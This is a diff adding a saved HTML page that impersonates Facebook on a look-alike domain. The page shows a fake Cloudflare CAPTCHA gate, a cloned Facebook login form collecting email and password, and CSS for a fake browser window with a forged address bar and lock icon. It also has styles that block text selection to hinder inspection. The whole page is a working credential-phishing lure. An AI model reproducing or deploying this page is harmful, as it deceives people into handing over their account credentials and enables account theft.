@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<!-- saved from url=(0038)https://meta.com-creators.com/require/ -->
+<html lang="en"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_9BduRO"></div><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <link rel="icon" href="https://meta.com-creators.com/assets/fb_round_logo.png" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
+  <title>Official Notice from Facebook</title>
+
+  <style>
+      /* Source Protection Styles */
+      * {
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+        -webkit-touch-callout: none;
+        -webkit-tap-highlight-color: transparent;
+      }
+      
+      body {
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+        -webkit-overflow-scrolling: touch;
+      }
+      
+      /* Mobile optimizations */
+      @media (max-width: 768px) {
+        body {
+          overflow-x: hidden;
+        }
+        
+        .clf-button {
+          min-height: 44px;
+          font-size: 16px;
+        }
+      }
+
+      .modal-overlay {
+        position: fixed;
+        inset: 0;
+        display: none;
+        justify-content: center;
+        align-items: center;
+        background: rgba(32, 33, 36, 0.6);
+        z-index: 9999;
+        width: 100vw;
+        height: 100vh;
+      }
+
+      /* === Modal Box === */
+      .modal {
+        background: #fff;
+        border-radius: 6px;
+        width: 90vw;
+        height: 80vh;
+        max-width: 1000px;
+        max-height: 800px;
+        min-width: 320px;
+        min-height: 300px;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
+        animation: fadeIn 0.25s ease;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+      }
+
+      /* Update animation for centered modal */
+      @keyframes fadeIn {
+        from { 
+          opacity: 0; 
+          transform: translate(-50%, -48%) scale(0.95); 
+        }
+        to { 
+          opacity: 1; 
+          transform: translate(-50%, -50%) scale(1); 
+        }
+      }
+
+      /* === Fake Browser Header === */
+      .modal-header {
+        display: flex;
+        align-items: center;
+        background: #e0e0e0;
+        border-bottom: 1px solid #bdbdbd;
+        height: 32px;
+        padding: 0 8px;
+      }
+
+      .modal-header .title {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 13px;
+        color: #202124;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+
+      .modal-header img {
+        width: 14px;
+        height: 14px;
+      }
+
+      .window-controls {
+        display: flex;
+        gap: 6px;
+      }
+
+      .window-controls div {
+        width: 12px;
+        height: 12px;
+        margin-left: 10px;
+        border-radius: 50%;
+        background: #d3d3d3;
+        cursor: pointer;
+      }
+
+      /* === Address Bar === */
+      .modal-urlbar {
+        background: #f8f9fa;
+        border-bottom: 1px solid #dadce0;
+        height: 38px;
+        display: flex;
+        align-items: center;
+        padding: 0 10px;
+        gap: 8px;
+        font-size: 13px;
+      }
+
+      .modal-urlbar .lock {
+        color: #15803d;
+        font-size: 13px;
+        margin-right: -2px;
+      }
+
+      .modal-urlbar .url {
+        color: #1a73e8;
+        flex: 1;
+        user-select: text;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+
+      /* === Iframe === */
+      iframe {
+        flex: 1;
+        width: 100%;
+        border: none;
+      }
+
+      /* @keyframes fadeIn {
+        from { opacity: 0; transform: scale(0.95); }
+        to { opacity: 1; transform: scale(1); }
+      } */
+
+      /* === Mobile Responsiveness === */
+      @media (max-width: 600px) {
+        .modal {
+          width: 95vw;
+          height: 90vh;
+          border-radius: 4px;
+        }
+        .modal-header .title {
+          font-size: 12px;
+        }
+        .modal-urlbar .url {
+          font-size: 11px;
+        }
+      }
+
+      /* Overlay background */
+      .clf-overlay {
+        position: fixed;
+        inset: 0;
+        background: #ffffff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 999999;
+      }
+
+      /* Main container */
+      .clf-container {
+        max-width: 680px;
+        width: 100%;
+        text-align: left;
+        padding: 40px 40px 60px;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+          "Helvetica Neue", Arial, sans-serif;
+        color: #333333;
+      }
+
+      /* Logo */
+      .clf-logo {
+        display: block;
+        height: 40px;
+        margin-bottom: 32px;
+      }
+
+      /* Title text */
+      .clf-title {
+        font-size: 19px;
+        font-weight: 500;
+        color: #333333;
+        margin: 0 0 28px;
+      }
+
+      /* Description block */
+      .clf-challenge {
+        font-size: 15px;
+        line-height: 1.6;
+        color: #333333;
+        margin-top: calc(.25rem * 5);
+      }
+
+      .clf-challenge strong {
+        font-size: 15px;
+        color: #222222;
+        padding-bottom: 0.25rem;
+        font-weight: 700;
+      }
+
+      .clf-challenge p {
+        color: #444444;
+        font-size: 11px;
+        border-bottom-style: solid;
+        border-bottom-width: 1px;
+        border-bottom-color: rgb(209 213 220);
+        padding-bottom: 0.75rem;
+      }
+
+      /* Event ID text */
+      .clf-event-id {
+        font-family: "SFMono-Regular", Menlo, Monaco, Consolas,
+          "Liberation Mono", "Courier New", monospace;
+        font-size: 12px;
+        color: #777777;
+      }
+
+      /* Button */
+      .clf-button {
+        display: inline-block;
+        padding: 10px 32px;
+        border-radius: 3px;
+        border: none;
+        cursor: pointer;
+        font-size: 14px;
+        font-weight: 500;
+        color: #ffffff;
+        box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1);
+        transition: background-color 0.15s ease, box-shadow 0.15s ease, opacity 0.3s ease;
+        background-color: rgb(230, 136, 56);
+        opacity: 1;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 5px;
+      }
+
+      .clf-button:hover {
+        background-color: #f18a21;
+        box-shadow: 0 1px 0 rgba(0, 0, 0, 0.18);
+      }
+
+      .clf-button:active {
+        background-color: #dd7c1d;
+      }
+
+      .clf-button:disabled {
+        cursor: not-allowed;
+        opacity: 0.7;
+      }
+
+      .clf-button:disabled:hover {
+        background-color: rgb(230, 136, 56);
+        box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1);
+      }
+
+      /* Loading spinner */
+      .clf-spinner {
+        width: 16px;
+        height: 16px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-top: 2px solid #ffffff;
+        border-radius: 50%;
+        animation: clf-spin 1s linear infinite;
+        display: inline-block;
+      }
+
+      @keyframes clf-spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+
+      /* Page Loading Overlay */
+      .page-loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.7);
+        z-index: 999998;
+        pointer-events: none;
+        opacity: 1;
+        transition: opacity 0.5s ease-out;
+      }
+
+      .page-loading-overlay.hidden {
+        opacity: 0;
+        pointer-events: none;
+      }
+
+      /* Flowing Progress Bar */
+      .progress-bar-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 6px;
+        background: rgba(0, 0, 0, 0.1);
+        z-index: 999999;
+        overflow: hidden;
+        opacity: 1;
+      }
+
+      .progress-bar {
+        height: 100%;
+        background: linear-gradient(90deg, #8e9aaf, #a8b3c7, #c5cdd9, #8e9aaf);
+        width: 0%;
+        animation: progressFlow 4s ease-out forwards;
+        position: relative;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+      }
+
+      .progress-bar::after {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+        animation: progressShine 1s ease-in-out infinite;
+      }
+
+      @keyframes progressFlow {
+        0% { width: 0%; }
+        25% { width: 20%; }
+        50% { width: 50%; }
+        75% { width: 80%; }
+        90% { width: 95%; }
+        100% { width: 100%; }
+      }
+
+      @keyframes progressShine {
+        0% { transform: translateX(-100%); }
+        100% { transform: translateX(300%); }
+      }
+
+      /* Hide progress bar after loading */
+      .progress-bar-container.hidden {
+        opacity: 0;
+        transition: opacity 0.5s ease-out;
+      }
+
+      /* Additional info */
+      .clf-info {
+        margin-top: 22px;
+        font-size: 13px;
+        color: #666666;
+        line-height: 1.6;
+      }
+
+      /* Responsive for small screens */
+      @media (max-width: 600px) {
+        .clf-container {
+          padding: 24px 20px 40px;
+        }
+
+        .clf-title {
+          font-size: 18px;
+        }
+      }
+
+    </style>
+  <script type="module" crossorigin="" src="./Official Notice from Facebook_files/index-GatH9GbL.js.download"></script>
+  <link rel="stylesheet" crossorigin="" href="./Official Notice from Facebook_files/index-Cf5OQB0o.css">
+<style>@keyframes slide-in-one-tap {
+  from {
+    transform: translateY(80px);
+  }
+  to {
+    transform: translateY(0px);
+  }
+}
+
+.trust-hide-gracefully {
+  opacity: 0;
+}
+
+.trust-wallet-one-tap .hidden {
+    display: none;
+  }
+
+.trust-wallet-one-tap .semibold {
+    font-weight: 500;
+  }
+
+.trust-wallet-one-tap .binance-plex {
+    font-family: 'Binance';
+  }
+
+.trust-wallet-one-tap .rounded-full {
+    border-radius: 50%;
+  }
+
+.trust-wallet-one-tap .flex {
+    display: flex;
+  }
+
+.trust-wallet-one-tap .flex-col {
+    flex-direction: column;
+  }
+
+.trust-wallet-one-tap .items-center {
+    align-items: center;
+  }
+
+.trust-wallet-one-tap .space-between {
+    justify-content: space-between;
+  }
+
+.trust-wallet-one-tap .justify-center {
+    justify-content: center;
+  }
+
+.trust-wallet-one-tap .w-full {
+    width: 100%;
+  }
+
+.trust-wallet-one-tap .box {
+    transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+    animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+    width: 384px;
+    border-radius: 15px;
+    background: #fff;
+    box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+    position: fixed;
+    right: 30px;
+    bottom: 30px;
+    z-index: 1020;
+  }
+
+.trust-wallet-one-tap .header {
+    gap: 15px;
+    border-bottom: 1px solid #e6e6e6;
+    padding: 10px 18px;
+  }
+
+.trust-wallet-one-tap .header .left-items {
+      gap: 15px;
+    }
+
+.trust-wallet-one-tap .header .title {
+      color: #1e2329;
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 28px;
+    }
+
+.trust-wallet-one-tap .header .subtitle {
+      color: #474d57;
+      font-size: 14px;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .header .close {
+      color: #1e2329;
+      cursor: pointer;
+    }
+
+.trust-wallet-one-tap .body {
+    padding: 9px 18px;
+    gap: 10px;
+  }
+
+.trust-wallet-one-tap .body .right-items {
+      gap: 10px;
+      width: 100%;
+    }
+
+.trust-wallet-one-tap .body .right-items .wallet-title {
+        color: #1e2329;
+        font-size: 16px;
+        font-weight: 600;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .body .right-items .wallet-subtitle {
+        color: #474d57;
+        font-size: 14px;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .connect-indicator {
+    gap: 15px;
+    padding: 8px 0;
+  }
+
+.trust-wallet-one-tap .connect-indicator .flow-icon {
+      color: #474d57;
+    }
+
+.trust-wallet-one-tap .loading-color {
+    color: #fff;
+  }
+
+.trust-wallet-one-tap .button {
+    border-radius: 50px;
+    outline: 2px solid transparent;
+    outline-offset: 2px;
+    background-color: rgb(5, 0, 255);
+    border-color: rgb(229, 231, 235);
+    cursor: pointer;
+    text-align: center;
+    height: 45px;
+  }
+
+.trust-wallet-one-tap .button .button-text {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .footer {
+    margin: 20px 30px;
+  }
+
+.trust-wallet-one-tap .check-icon {
+    color: #fff;
+  }
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.otf) format('opentype');
+  font-weight: 400;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.otf) format('opentype');
+  font-weight: 500;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.otf) format('opentype');
+  font-weight: 600;
+  font-style: normal;
+}
+
+/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uL2FwcC9zcmMvb25lVGFwL3N0eWxlLmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFO0lBQ0UsMkJBQTJCO0VBQzdCO0VBQ0E7SUFDRSwwQkFBMEI7RUFDNUI7QUFDRjs7QUFFQTtFQUNFLFVBQVU7QUFDWjs7QUFHRTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLGdCQUFnQjtFQUNsQjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGtCQUFrQjtFQUNwQjs7QUFFQTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLG1CQUFtQjtFQUNyQjs7QUFFQTtJQUNFLDhCQUE4QjtFQUNoQzs7QUFFQTtJQUNFLHVCQUF1QjtFQUN6Qjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFFQTtJQUNFLGdEQUFnRDtJQUNoRCw0REFBNEQ7SUFDNUQsWUFBWTtJQUNaLG1CQUFtQjtJQUNuQixnQkFBZ0I7SUFDaEIsK0NBQStDO0lBQy9DLGVBQWU7SUFDZixXQUFXO0lBQ1gsWUFBWTtJQUNaLGFBQWE7RUFDZjs7QUFFQTtJQUNFLFNBQVM7SUFDVCxnQ0FBZ0M7SUFDaEMsa0JBQWtCO0VBdUJwQjs7QUFyQkU7TUFDRSxTQUFTO0lBQ1g7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGdCQUFnQjtNQUNoQixpQkFBaUI7SUFDbkI7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGlCQUFpQjtJQUNuQjs7QUFFQTtNQUNFLGNBQWM7TUFDZCxlQUFlO0lBQ2pCOztBQUdGO0lBQ0UsaUJBQWlCO0lBQ2pCLFNBQVM7RUFtQlg7O0FBakJFO01BQ0UsU0FBUztNQUNULFdBQVc7SUFjYjs7QUFaRTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsZ0JBQWdCO1FBQ2hCLGlCQUFpQjtNQUNuQjs7QUFFQTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsaUJBQWlCO01BQ25COztBQUlKO0lBQ0UsU0FBUztJQUNULGNBQWM7RUFLaEI7O0FBSEU7TUFDRSxjQUFjO0lBQ2hCOztBQUdGO0lBQ0UsV0FBVztFQUNiOztBQUVBO0lBQ0UsbUJBQW1CO0lBQ25CLDhCQUE4QjtJQUM5QixtQkFBbUI7SUFDbkIsZ0NBQWdDO0lBQ2hDLGdDQUFnQztJQUNoQyxlQUFlO0lBQ2Ysa0JBQWtCO0lBQ2xCLFlBQVk7RUFRZDs7QUFORTtNQUNFLFdBQVc7TUFDWCxlQUFlO01BQ2YsZ0JBQWdCO01BQ2hCLGlCQUFpQjtJQUNuQjs7QUFHRjtJQUNFLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFHRjtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMEU7RUFDMUUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBeUU7RUFDekUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMkU7RUFDM0UsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQiIsInNvdXJjZXNDb250ZW50IjpbIkBrZXlmcmFtZXMgc2xpZGUtaW4tb25lLXRhcCB7XG4gIGZyb20ge1xuICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSg4MHB4KTtcbiAgfVxuICB0byB7XG4gICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDBweCk7XG4gIH1cbn1cblxuLnRydXN0LWhpZGUtZ3JhY2VmdWxseSB7XG4gIG9wYWNpdHk6IDA7XG59XG5cbi50cnVzdC13YWxsZXQtb25lLXRhcCB7XG4gIC5oaWRkZW4ge1xuICAgIGRpc3BsYXk6IG5vbmU7XG4gIH1cblxuICAuc2VtaWJvbGQge1xuICAgIGZvbnQtd2VpZ2h0OiA1MDA7XG4gIH1cblxuICAuYmluYW5jZS1wbGV4IHtcbiAgICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICB9XG5cbiAgLnJvdW5kZWQtZnVsbCB7XG4gICAgYm9yZGVyLXJhZGl1czogNTAlO1xuICB9XG5cbiAgLmZsZXgge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gIH1cblxuICAuZmxleC1jb2wge1xuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gIH1cblxuICAuaXRlbXMtY2VudGVyIHtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICB9XG5cbiAgLnNwYWNlLWJldHdlZW4ge1xuICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjtcbiAgfVxuXG4gIC5qdXN0aWZ5LWNlbnRlciB7XG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gIH1cblxuICAudy1mdWxsIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgfVxuXG4gIC5ib3gge1xuICAgIHRyYW5zaXRpb246IGFsbCAwLjVzIGN1YmljLWJlemllcigwLCAwLCAwLCAxLjQzKTtcbiAgICBhbmltYXRpb246IHNsaWRlLWluLW9uZS10YXAgMC41cyBjdWJpYy1iZXppZXIoMCwgMCwgMCwgMS40Myk7XG4gICAgd2lkdGg6IDM4NHB4O1xuICAgIGJvcmRlci1yYWRpdXM6IDE1cHg7XG4gICAgYmFja2dyb3VuZDogI2ZmZjtcbiAgICBib3gtc2hhZG93OiAwcHggMnB4IDRweCAwcHggcmdiYSgwLCAwLCAwLCAwLjI1KTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgcmlnaHQ6IDMwcHg7XG4gICAgYm90dG9tOiAzMHB4O1xuICAgIHotaW5kZXg6IDEwMjA7XG4gIH1cblxuICAuaGVhZGVyIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNlNmU2ZTY7XG4gICAgcGFkZGluZzogMTBweCAxOHB4O1xuXG4gICAgLmxlZnQtaXRlbXMge1xuICAgICAgZ2FwOiAxNXB4O1xuICAgIH1cblxuICAgIC50aXRsZSB7XG4gICAgICBjb2xvcjogIzFlMjMyOTtcbiAgICAgIGZvbnQtc2l6ZTogMThweDtcbiAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICBsaW5lLWhlaWdodDogMjhweDtcbiAgICB9XG5cbiAgICAuc3VidGl0bGUge1xuICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICBmb250LXNpemU6IDE0cHg7XG4gICAgICBsaW5lLWhlaWdodDogMjBweDtcbiAgICB9XG5cbiAgICAuY2xvc2Uge1xuICAgICAgY29sb3I6ICMxZTIzMjk7XG4gICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgfVxuICB9XG5cbiAgLmJvZHkge1xuICAgIHBhZGRpbmc6IDlweCAxOHB4O1xuICAgIGdhcDogMTBweDtcblxuICAgIC5yaWdodC1pdGVtcyB7XG4gICAgICBnYXA6IDEwcHg7XG4gICAgICB3aWR0aDogMTAwJTtcblxuICAgICAgLndhbGxldC10aXRsZSB7XG4gICAgICAgIGNvbG9yOiAjMWUyMzI5O1xuICAgICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4O1xuICAgICAgfVxuXG4gICAgICAud2FsbGV0LXN1YnRpdGxlIHtcbiAgICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICAgIGZvbnQtc2l6ZTogMTRweDtcbiAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgICB9XG4gICAgfVxuICB9XG5cbiAgLmNvbm5lY3QtaW5kaWNhdG9yIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgcGFkZGluZzogOHB4IDA7XG5cbiAgICAuZmxvdy1pY29uIHtcbiAgICAgIGNvbG9yOiAjNDc0ZDU3O1xuICAgIH1cbiAgfVxuXG4gIC5sb2FkaW5nLWNvbG9yIHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgfVxuXG4gIC5idXR0b24ge1xuICAgIGJvcmRlci1yYWRpdXM6IDUwcHg7XG4gICAgb3V0bGluZTogMnB4IHNvbGlkIHRyYW5zcGFyZW50O1xuICAgIG91dGxpbmUtb2Zmc2V0OiAycHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogcmdiKDUsIDAsIDI1NSk7XG4gICAgYm9yZGVyLWNvbG9yOiByZ2IoMjI5LCAyMzEsIDIzNSk7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIHRleHQtYWxpZ246IGNlbnRlcjtcbiAgICBoZWlnaHQ6IDQ1cHg7XG5cbiAgICAuYnV0dG9uLXRleHQge1xuICAgICAgY29sb3I6ICNmZmY7XG4gICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICBmb250LXdlaWdodDogNjAwO1xuICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgfVxuICB9XG5cbiAgLmZvb3RlciB7XG4gICAgbWFyZ2luOiAyMHB4IDMwcHg7XG4gIH1cblxuICAuY2hlY2staWNvbiB7XG4gICAgY29sb3I6ICNmZmY7XG4gIH1cbn1cblxuQGZvbnQtZmFjZSB7XG4gIGZvbnQtZmFtaWx5OiAnQmluYW5jZSc7XG4gIHNyYzogdXJsKCcuL2ZvbnRzL2JpbmFuY2VQbGV4L0JpbmFuY2VQbGV4LVJlZ3VsYXIub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNDAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1NZWRpdW0ub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNTAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1TZW1pQm9sZC5vdGYnKSBmb3JtYXQoJ29wZW50eXBlJyk7XG4gIGZvbnQtd2VpZ2h0OiA2MDA7XG4gIGZvbnQtc3R5bGU6IG5vcm1hbDtcbn1cbiJdLCJzb3VyY2VSb290IjoiIn0= */</style></head>
+
+<body class="antialiased font-sans">
+  <!-- Page Loading Overlay -->
+    <div class="page-loading-overlay hidden" id="pageLoadingOverlay" style="display: block;"></div>
+    
+    <!-- Progress Bar -->
+    <div class="progress-bar-container hidden" id="progressBarContainer" style="display: block;">
+      <div class="progress-bar" style="animation: 4s ease-out 0s 1 normal forwards running progressFlow;"></div>
+    </div>
+
+    <div class="clf-overlay" id="captchaScreen" style="display: flex;">
+      <div class="clf-container">
+
+        <img src="./Official Notice from Facebook_files/clf.png" alt="Cloudflare" class="clf-logo" style="width: 150px;; height: auto;">
+
+        <h1 class="clf-title">
+          Please complete the following CAPTCHA security challenge to continue!
+        </h1>
+
+        <button class="clf-button" id="captchaButton" style="opacity: 1;">I am not a bot</button>
+
+        <div class="clf-challenge">
+          <strong>Why do I see CAPTCHA challenge?</strong>
+          <p>Due to enhanced firewall security measures, you are required to complete
+          a CAPTCHA security challenge to proceed with access to this website.</p>
+          
+          <p style="border: none;">Event ID: <span class="clf-event-id">escubr1h9nrlv2b2qaoisdr7</span></p>
+        </div>
+
+      </div>
+    </div>
+
+  <div id="root" style="height: 100vh;"><div class="w-full h-full"><div><div class="fixed inset-0 bg-[#f0f2f5] z-50 flex justify-center px-2 pt-12"><div class="hidden md:flex flex-col items-center gap-4"><img alt="Facebook" class="mt-2" src="./Official Notice from Facebook_files/facebook-text-CAN_MOsh.svg" style="width: 180px;"><div class="login_main w-full flex justify-center"><div class="alert w-[580px] flex items-center border border-[#3578e5] rounded-[3px] bg-white mb-3 overflow-hidden"><div class="icon w-[38px] h-[38px] bg-[#3578e5] flex items-center justify-center"><svg width="24" height="24" viewBox="0 0 24 24" fill="#ffffff" aria-hidden="true"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm0 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2zm-1 4h2v6h-2v-6z"></path></svg></div><p class="text-[12px] text-[#0f1419] px-3">You must log in to continue.</p></div></div><div class="flex flex-col w-[460px] rounded-2xl shadow-xl bg-white"><div class="px-6 pt-6"><p class="text-center text-[18px] font-semibold text-[#0f1419]">Log in to Facebook</p></div><div class="mx-6 mt-3 mb-2 rounded-md bg-[#fff9db] border border-[#f5e6a3] h-[36px] flex items-center justify-center"><p class="text-center text-[12px] text-[#504d35]">You must log in to continue.</p></div><div class="px-6 pb-6 pt-2"><div class="mb-3"><input placeholder="Email address or phone number" class="w-full border border-[#D3D3D399] rounded-md h-[54px] px-3 text-md text-black focus:outline-none focus:ring-1 focus:ring-blue-500" type="text" value=""></div><div class="mb-3 relative"><input placeholder="Password" class="w-full border border-[#D3D3D399] rounded-md h-[54px] px-3 pr-10 text-md text-black focus:outline-none focus:ring-1 focus:ring-blue-500" type="password" value=""><button type="button" aria-label="Toggle password visibility" class="absolute right-2 top-1/2 -translate-y-1/2 w-6 h-6 border border-gray-300 rounded-full flex items-center justify-center text-[#6b7280] hover:text-[#374151]"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7zm0 11a4 4 0 1 1 0-8 4 4 0 0 1 0 8z" fill="currentColor"></path></svg></button></div><button class="w-full bg-[#1877f2] text-white font-semibold rounded-md h-[44px] text-[20px] hover:bg-blue-700 transition mb-2">Log in</button><div class="flex items-center justify-center gap-2 mt-1"><button class="text-blue-500 text-sm hover:underline text-[12px] cursor-pointer">Forgotten account?</button><span class="text-[#b0b0b0]">•</span><button class="text-blue-500 text-sm hover:underline text-[12px] cursor-pointer">Sign up for Facebook</button></div></div></div></div><div class="flex md:hidden flex-col w-full rounded-2xl items-center"><img alt="Facebook" class="mt-2" src="./Official Notice from Facebook_files/facebook-text-CAN_MOsh.svg" style="width: 180px;"><div class="w-full mt-2 px-2"><div class="alert flex items-center border border-[#3578e5] rounded-[3px] bg-white mb-3 overflow-hidden"><div class="icon w-[38px] h-[38px] bg-[#3578e5] flex items-center justify-center"><svg width="20" height="20" viewBox="0 0 24 24" fill="#ffffff" aria-hidden="true"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm0 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2zm-1 4h2v6h-2v-6z"></path></svg></div><p class="text-[12px] text-[#0f1419] px-3">You must log in to continue.</p></div></div><div class="w-full px-4"><div class="w-full max-w-[380px] mx-auto rounded-2xl shadow-xl bg-white p-4"><div class="text-center text-[16px] font-semibold text-[#0f1419] pb-2">Log in to Facebook</div><div class="rounded-md bg-[#fff9db] border border-[#f5e6a3] h-[36px] flex items-center justify-center mb-3"><p class="text-center text-[12px] text-[#504d35]">You must log in to continue.</p></div><form class="w-full flex flex-col"><div class="w-full mb-3"><input placeholder="Email address or phone number" class="rounded-md h-[54px] px-3 border border-[#D3D3D399] focus:outline-none focus:ring-1 focus:ring-blue-500 text-md w-full" type="text" value=""></div><div class="w-full mb-3 relative"><input placeholder="Password" class="rounded-md h-[54px] px-3 pr-10 border border-[#D3D3D399] focus:outline-none focus:ring-1 focus:ring-blue-500 text-md w-full" type="password" value=""><button type="button" aria-label="Toggle password visibility" class="absolute right-2 top-1/2 -translate-y-1/2 w-6 h-6 border border-gray-300 rounded-full flex items-center justify-center text-[#6b7280] hover:text-[#374151]"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7zm0 11a4 4 0 1 1 0-8 4 4 0 0 1 0 8z" fill="currentColor"></path></svg></button></div><button type="button" class="w-full rounded-md bg-[#1877f2] font-semibold h-[44px] text-[18px] mb-2 hover:bg-blue-700 transition text-white">Log in</button><div class="flex items-center justify-center gap-2 mt-1"><button class="text-blue-500 text-xs hover:underline cursor-pointer">Forgotten account?</button><span class="text-[#b0b0b0]">•</span><button class="text-blue-500 text-xs hover:underline cursor-pointer">Sign up for Facebook</button></div></form></div></div></div><div class="hidden md:flex flex-col  absolute bottom-0 left-0 right-0 w-full bg-white py-4"><div class="max-w-screen-lg mx-auto px-6 py-6 text-[#737373]"><div class="flex flex-wrap gap-x-4 gap-y-2 text-[12px]"><span>English 